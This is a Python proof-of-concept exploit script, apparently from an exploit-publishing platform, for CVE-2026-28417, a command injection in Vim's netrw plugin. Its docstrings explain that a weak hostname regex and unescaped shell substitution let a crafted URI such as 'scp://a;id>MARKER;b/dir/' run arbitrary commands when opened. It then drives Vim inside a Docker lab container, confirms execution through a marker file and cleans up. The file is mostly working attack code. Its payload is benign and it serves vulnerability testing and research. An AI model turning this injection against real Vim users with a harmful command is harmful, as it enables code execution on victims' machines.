#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Vim netrw OS Command Injection — Semicolon Injection
# CVE            : CVE-2026-28417
# Vendor         : vim
# Product        : Vim
# Affected       : < v9.2.0073 (netrw plugin)
# Type           : CWE-78 - OS Command Injection
# CVSS           : 4.4 (Medium)
# Platform       : Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2026-02-28
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
Vim netrw OS Command Injection — Semicolon Injection PoC

Demonstrates command injection via crafted netrw URI (scp://) hostname
in Vim versions prior to 9.2.0073.

Root Cause:
  1. s:NetrwValidateHostname() uses weak regex '^[a-z0-9]' — only checks
     that hostname starts with an alphanumeric char, allowing shell metacharacters.
  2. s:MakeSshCmd() substitutes the hostname directly into shell commands
     without shellescape(), allowing the metacharacters to execute.

Attack Vector:
  Opening a URI like `scp://a;INJECTED_CMD;b/dir/` in Vim causes netrw to
  construct a shell command: `ssh a;INJECTED_CMD;b ls -FLa`
  The shell interprets `;` as command separator and executes INJECTED_CMD.

Usage:
  python3 poc.py                          # Uses default container name
  python3 poc.py <container_name>         # Specify container name

Requires: Docker access to the vulnerable container (cve-2026-28417-vulnerable)

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2026-28417
  - https://github.com/vim/vim/commit/79348dbbc09332130f4c86045e1541d68514fcc1
"""

import subprocess
import sys
import time
import uuid


# Default lab container name
DEFAULT_CONTAINER = "cve-2026-28417-vulnerable"

# Marker file name (unique per run to avoid false positives)
MARKER = f"CVE-2026-28417-{uuid.uuid4().hex[:8]}"

# Working directory inside the container
WORKDIR = "/workspace"


def docker_exec(container: str, cmd: str, timeout: int = 30) -> tuple[int, str, str]:
    """Execute a command inside the Docker container.

    Returns (returncode, stdout, stderr).
    """
    full_cmd = ["docker", "exec", container, "bash", "-c", cmd]
    try:
        result = subprocess.run(
            full_cmd,
            capture_output=True,
            text=True,
            timeout=timeout,
        )
        return result.returncode, result.stdout, result.stderr
    except subprocess.TimeoutExpired:
        return -1, "", "Command timed out"


def check_container(container: str) -> bool:
    """Verify the target container is running."""
    result = subprocess.run(
        ["docker", "inspect", "-f", "{{.State.Running}}", container],
        capture_output=True, text=True,
    )
    return result.returncode == 0 and "true" in result.stdout.strip()


def check_vim_version(container: str) -> str:
    """Get the Vim version installed in the container."""
    rc, stdout, _ = docker_exec(container, "vim --version | head -1")
    if rc == 0:
        return stdout.strip()
    return "unknown"


def check_netrw_vulnerable(container: str) -> bool:
    """Check if the netrw plugin has the vulnerable hostname validation."""
    cmd = (
        "grep -c \"return a:hostname =~? '\\^\\[a-z0-9\\]'\" "
        "/usr/local/share/vim/vim92/pack/dist/opt/netrw/autoload/netrw.vim 2>/dev/null"
    )
    rc, stdout, _ = docker_exec(container, cmd)
    try:
        return int(stdout.strip()) > 0
    except ValueError:
        return False


def exploit_semicolon_injection(container: str, marker: str) -> bool:
    """
    Primary exploit: Semicolon-based command injection via scp:// URI.

    Payload: scp://a;id>MARKER;b/dir/

    netrw extracts hostname 'a;id>MARKER;b', which passes the weak
    validation (starts with 'a'). MakeSshCmd constructs:
        ssh  a;id>MARKER;b ls -FLa
    Shell interprets ';' as separator, executing:
        1. ssh a          (fails — no such host)
        2. id>MARKER      (RCE! writes 'id' output to marker file)
        3. b ls -FLa      (fails — 'b' is not a command)

    Note: '/' cannot appear in hostname (URL parsing terminates at '/'),
    so we write to the working directory using '>' redirect.
    """
    print(f"[*] Payload: scp://a;id>{marker};b/dir/")
    print(f"[*] Expected command: ssh  a;id>{marker};b ls -FLa")
    print()

    # Step 1: Clean up any previous marker file
    docker_exec(container, f"rm -f {WORKDIR}/{marker}")

    # Step 2: Trigger the vulnerability via Vim netrw
    # --clean: minimal config, no user vimrc, but allows packaged plugins
    # packadd netrw: explicitly load the netrw plugin
    # e scp://a;id>MARKER;b/dir/: open crafted URI, triggering command injection
    # qa!: quit Vim immediately after
    # </dev/null: prevent Vim from reading terminal input
    # >/dev/null 2>&1: suppress Vim terminal escape codes
    vim_cmd = (
        f"cd {WORKDIR} && "
        f"timeout 20 vim --clean "
        f"-c 'packadd netrw' "
        f"-c 'e scp://a;id>{marker};b/dir/' "
        f"-c 'qa!' "
        f"</dev/null >/dev/null 2>&1 || true"
    )
    print("[*] Executing Vim with crafted netrw URI inside container...")
    docker_exec(container, vim_cmd, timeout=30)

    # Step 3: Check if the marker file was created (proves command injection)
    rc, stdout, _ = docker_exec(container, f"cat {WORKDIR}/{marker} 2>/dev/null")
    if rc == 0 and stdout.strip():
        print(f"[+] VULNERABLE! Marker file created with contents:")
        print(f"    {stdout.strip()}")
        return True
    else:
        print(f"[-] Marker file not found — exploit may have failed")
        return False


def cleanup(container: str, marker: str):
    """Remove the marker file from the container."""
    docker_exec(container, f"rm -f {WORKDIR}/{marker}")


def main():
    container = sys.argv[1] if len(sys.argv) > 1 else DEFAULT_CONTAINER

    print("=" * 70)
    print(f"  CVE-2026-28417: Vim netrw OS Command Injection PoC")
    print("=" * 70)
    print()
    print(f"  Target container: {container}")
    print(f"  Marker file:     {MARKER}")
    print()

    # Pre-flight checks
    print("[*] Step 1: Checking container is running...")
    if not check_container(container):
        print(f"[-] FATAL: Container '{container}' is not running.")
        print(f"    Start it with: docker compose up -d")
        sys.exit(1)
    print(f"[+] Container '{container}' is running.")
    print()

    print("[*] Step 2: Checking Vim version...")
    vim_version = check_vim_version(container)
    print(f"[+] Vim version: {vim_version}")
    print()

    print("[*] Step 3: Checking if netrw has vulnerable hostname validation...")
    if check_netrw_vulnerable(container):
        print("[+] Vulnerable regex pattern found: '^[a-z0-9]' (unanchored, no end check)")
    else:
        print("[!] Warning: Could not confirm vulnerable regex pattern.")
        print("    The exploit may still work if this is a pre-9.2.0073 version.")
    print()

    # Execute exploit
    print("[*] Step 4: Executing semicolon-based command injection...")
    print("-" * 50)
    success = exploit_semicolon_injection(container, MARKER)
    print("-" * 50)
    print()

    # Result
    if success:
        print("=" * 70)
        print("[+] RESULT: VULNERABLE — CVE-2026-28417 CONFIRMED")
        print("=" * 70)
        print()
        print("[+] The netrw plugin executed an injected 'id' command via")
        print("[+] crafted scp:// URI hostname. Shell metacharacters in the")
        print("[+] hostname bypass weak validation and are substituted")
        print("[+] unescaped into shell commands by MakeSshCmd().")
        print()
        print("[*] Cleaning up marker file...")
        cleanup(container, MARKER)
        sys.exit(0)
    else:
        print("=" * 70)
        print("[-] RESULT: EXPLOIT FAILED — could not confirm vulnerability")
        print("=" * 70)
        sys.exit(1)


if __name__ == "__main__":
    main()
